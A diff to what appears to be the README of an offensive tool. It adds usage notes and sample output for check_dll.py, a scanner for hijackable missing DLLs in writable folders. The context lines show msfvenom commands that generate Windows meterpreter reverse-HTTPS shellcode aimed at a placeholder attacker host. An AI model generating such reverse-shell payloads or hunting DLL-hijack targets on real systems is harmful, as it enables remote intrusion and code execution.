@@ -135,6 +135,26 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=
 msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw > shellcode.bin
 ```
 
+**Finding vulnerable target executables**
+
+check_dll.py scans a single .exe or .msi for potentially hijackable missing DLLs in writable paths, prints findings to stdout, and logs CSV results to a per-target file:
+```
+D:\>python check_dll.py targets\some-program.exe
+
+[*] Scan target: targets\some-program.exe
+    DLL: 32.dll  |  Location: .\  |  EXE directory is writable, DLL missing
+    DLL: 32.dll  |  Location: C:\Users\test\AppData\Roaming  |  Writable location, DLL missing
+    DLL: 32.dll  |  Location: C:\Users\test\AppData\Local\Temp  |  Writable location, DLL missing
+    DLL: msimg32.dll  |  Location: .\  |  EXE directory is writable, DLL missing
+    DLL: msimg32.dll  |  Location: C:\Users\test\AppData\Roaming  |  Writable location, DLL missing
+    DLL: msimg32.dll  |  Location: C:\Users\test\AppData\Local\Temp  |  Writable location, DLL missing
+    DLL: shlwapi.dll  |  Location: .\  |  EXE directory is writable, DLL missing
+    DLL: shlwapi.dll  |  Location: C:\Users\test\AppData\Roaming  |  Writable location, DLL missing
+    DLL: shlwapi.dll  |  Location: C:\Users\test\AppData\Local\Temp  |  Writable location, DLL missing
+    DLL: uxtheme.dll  |  Location: .\  |  EXE directory is writable, DLL missing
+
+```
+
 ---
 
 ## Disclaimer
